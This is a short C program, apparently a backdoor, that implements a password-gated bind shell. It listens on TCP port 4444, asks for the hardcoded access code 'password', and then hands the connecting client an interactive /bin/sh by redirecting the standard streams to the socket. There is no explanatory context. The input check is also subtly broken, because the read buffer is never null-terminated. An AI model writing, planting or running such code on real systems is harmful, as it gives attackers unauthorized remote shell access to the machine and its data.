#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>


main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };

	if((sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1)
	{
		perror("Server socket: ");
		exit(-1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
	{
		perror("Bind: ");
		exit(-1);
	}

	if((listen(sock, 2)) == -1)
	{
		perror("Listen: ");
		exit(-1);
	}

	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
	{
		perror("Accept: ");
		exit(-1);	
	}

	close(sock);

	send(new, (char*)"Enter Access Code: ", 20, 0);

	char in[200];

	read(new, in, 199);

	printf("%s\n", in);

	if(strcmp(in, "password") != 0)
	{
		send(new, (char*)"Goodbye\n", 8, 0);
		close(new);
		perror("Auth: ");
		exit(-1);
	}
	else
	{
		send(new, (char*)"Welcome\n", 8, 0);
	}

	dup2(new, 0);
	dup2(new, 1);
	dup2(new, 2);

	execve(arguments[0], &arguments[0], NULL);

	close(new);
}